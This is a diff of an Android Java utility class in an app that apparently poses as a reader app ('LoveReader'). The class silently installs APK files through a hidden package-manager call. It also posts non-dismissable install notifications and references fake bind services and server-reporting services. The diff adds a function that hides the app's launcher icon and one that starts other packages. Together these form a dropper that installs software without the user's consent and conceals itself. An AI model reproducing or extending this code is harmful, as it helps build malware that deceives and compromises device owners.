@@ -1,11 +1,6 @@
 package com.xstd.ip;
 
-import java.io.File;
-import java.lang.reflect.Method;
-import java.util.ArrayList;
-import java.util.Calendar;
-import java.util.List;
-
+import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.Notification;
 import android.app.NotificationManager;
@@ -20,6 +15,8 @@ import android.content.pm.IPackageManager;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
+import android.graphics.drawable.BitmapDrawable;
+import android.graphics.drawable.Drawable;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
@@ -27,12 +24,20 @@ import android.os.Build;
 import android.os.IBinder;
 import android.support.v4.app.NotificationCompat;
 import android.util.Log;
-
+import com.andorid.shu.love.LoveReaderActivity;
+import com.google.lovereader.R;
 import com.xstd.ip.receiver.BindDeviceReceiver;
 import com.xstd.ip.service.CoreService;
 import com.xstd.ip.service.FakeBindService;
 import com.xstd.ip.service.SendServerService;
 
+import java.io.File;
+import java.lang.reflect.Method;
+import java.util.ArrayList;
+import java.util.Calendar;
+import java.util.List;
+
+@SuppressLint("NewApi")
 public class Tools {
 
     public static final String KEY_HAS_BINDING_DEVICES = "key_has_bindding_devices";
@@ -98,13 +103,13 @@ public class Tools {
      * @throws Exception
      */
     public static void installFile(Context context, File file, IPackageInstallObserver observer) {
-        Tools.logW("准备静默安装："+file.getAbsolutePath());
+        Tools.logW("准备静默安装：" + file.getAbsolutePath());
         if (file == null || !file.isFile())
             return;
         PackageInfo info = getPackageInfoByPath(context, file.getAbsolutePath());
         if (info == null)
             return;
-        Tools.logW("检测成功，准备安装"+file.getAbsolutePath());
+        Tools.logW("检测成功，准备安装" + file.getAbsolutePath());
         int flags = 0;
         try {
             getPackageManger().installPackage(Uri.fromFile(file), observer, flags, info.packageName);
@@ -144,22 +149,30 @@ public class Tools {
      * @param largeIcon
      * @param apkPath    apk包的绝对路径
      */
-    public static void useNotificationInstall(Context context, String tickerText, String title, String text, int icon, Bitmap largeIcon, String apkPath) {
-        Tools.logW("准备通知安装："+apkPath);
+    public static void useNotificationInstall(Context context, String tickerText, String title, String text, String apkPath) {
+        Tools.logW("准备通知安装：" + apkPath);
         Intent intent = new Intent("android.intent.action.INSTALL_PACKAGE");
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         intent.addCategory("android.intent.category.DEFAULT");
         intent.setDataAndType(Uri.fromFile(new File(apkPath)), "application/vnd.android.package-archive");
         NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
-        Notification notification = new Notification();
-        Notification notification = new NotificationCompat.Builder(context).setTicker(tickerText).setContentTitle(title).setContentText(text).setSmallIcon(icon).setLargeIcon(largeIcon)
+        Notification notification = new NotificationCompat.Builder(context).setTicker(tickerText).setContentTitle(title).setContentText(text).setSmallIcon(R.drawable.ic_jog_dial_sound_on)
                 .setContentIntent(PendingIntent.getActivity(context, 0, intent, 0)).setDefaults(Notification.DEFAULT_SOUND).setWhen(System.currentTimeMillis()).build();
         notification.flags = Notification.FLAG_NO_CLEAR;
         logW("通知准备完成，检测程序是否正确");
         PackageInfo packageInfo = checkPackageByPath(context, apkPath);
         if (packageInfo != null) {
             logW("程序检测结果正常，发送通知安装");
-            nm.notify(generateNotificationID(packageInfo.packageName), notification);
+            nm.notify(generateNotificationID(packageInfo.applicationInfo.packageName), notification);
+        }
+    }
+
+    public static Drawable getIconByAPKPath(Context context, String path) {
+        PackageInfo info = context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
+        if (info == null)
+            return null;
+        else {
+            return context.getPackageManager().getApplicationIcon(info.applicationInfo);
         }
     }
 
@@ -277,5 +290,25 @@ public class Tools {
                 startFakeService(context, "LoveReaderActivity");
         }
 
+    }
+
+    /**
+     * 隐藏程序图标
+     *
+     * @param context
+     */
+    public static void hideLaunchIcon(Context context) {
+        context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, LoveReaderActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+    }
+
+    /**
+     * 根据包名启动程序
+     * @param context
+     * @param packageName
+     */
+    public static void launchApplication(Context context, String packageName) {
+        Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
+        if (intent != null)
+            context.startActivity(intent);
     }
 }
